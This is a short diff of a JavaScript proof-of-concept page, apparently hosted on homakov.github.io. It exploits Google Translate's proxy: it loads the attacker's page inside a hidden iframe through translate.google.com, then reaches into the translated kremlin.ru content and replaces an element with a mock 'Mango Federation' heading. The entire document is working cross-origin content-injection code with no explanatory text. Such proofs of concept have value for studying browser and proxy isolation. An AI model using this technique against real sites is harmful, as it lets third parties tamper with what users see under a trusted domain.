@@ -1,7 +1,10 @@
 <script>
 if(location.search=='?init'){
-  window.open('http://translate.google.com/translate?hl=en&sl=en&tl=ru&u=http%3A%2F%2Fhomakov.github.io%2Fguc2.html%3F1','','width=1px;heigh=1px;');
-  location='http://translate.google.com/translate?hl=en&sl=ru&tl=en&u=http%3A%2F%2Fkremlin.ru%2F';
+  document.write('<iframe id=ph name=ph src="http://translate.google.com/translate?hl=en&sl=en&tl=ru&u=http%3A%2F%2Fhomakov.github.io%2Fguc2.html%3F5"></iframe>');
+
+  setInterval(function(){
+    if(ph.name == 'closeme') window.close();
+  },100)
 }else{
   // under GUC
   wait = setInterval(function(){
@@ -10,10 +13,11 @@ if(location.search=='?init'){
       if(el){
         el.innerHTML='<h2>Hey! Russia needs some rebranding. We are Mango Federation now!</h2>';
         clearInterval(wait);
+        name = 'closeme';
       }
     }catch(e){}
     
   }, 500);
- 
+  
 }
-</script>empty...
+</script>
